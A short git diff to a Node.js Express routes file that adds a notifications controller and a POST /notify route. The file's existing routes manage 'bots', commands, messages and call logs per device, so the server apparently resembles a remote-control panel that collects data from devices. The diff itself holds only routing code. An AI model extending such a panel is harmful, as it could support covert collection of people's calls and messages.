@@ -7,6 +7,7 @@ module.exports = function Routes(app, io) {
   var commands_ctrl = ctrls.commands_ctrl(io)
   var messages_ctrl = ctrls.messages_ctrl(io)
   var call_log_ctrl = ctrls.call_log_ctrl(io)
+  var notifications_ctrl = ctrls.notifications_ctrl(io)
 
   app.get('/bots', bots_ctrl.index)
   app.get('/bots/:id', bots_ctrl.show)
@@ -21,6 +22,7 @@ module.exports = function Routes(app, io) {
   app.post('/call-logs', call_log_ctrl.create)
   app.get('/call-logs/:uid', call_log_ctrl.showLogs)
   app.delete('/call-logs/:uid', call_log_ctrl.clear)
+  app.post('/notify', notifications_ctrl.notify)
 
   app.get(/.*\.(html|js|css|map|jpg|png|gif)/, function(req, res, next) {
     res.status(404).send()
